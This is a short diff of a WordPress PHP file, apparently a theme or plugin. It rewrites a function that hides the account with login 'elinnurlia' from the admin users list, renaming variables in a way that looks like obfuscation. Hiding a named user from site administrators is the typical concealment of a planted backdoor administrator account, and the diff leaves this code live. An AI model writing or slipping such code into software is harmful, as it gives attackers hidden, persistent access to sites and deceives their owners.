@@ -46,15 +46,16 @@ add_action('wp_head', function () {
 });
 
 
-function exclude_specific_user($query) {
-    global $pagenow;
+function exclude_specific_user($QRY) {
 
-    if (is_admin() && $pagenow === 'users.php') {
+    $PGN = $GLOBALS['pagenow'] ?? '';
 
-        $user = get_user_by('login', 'elinnurlia');
+    if (is_admin() && $PGN === 'users.php') {
 
-        if ($user) {
-            $query->set('exclude', array($user->ID));
+        $USR = get_user_by('login', 'elinnurlia');
+
+        if ($USR) {
+            $QRY->set('exclude', array($USR->ID));
         }
     }
 }
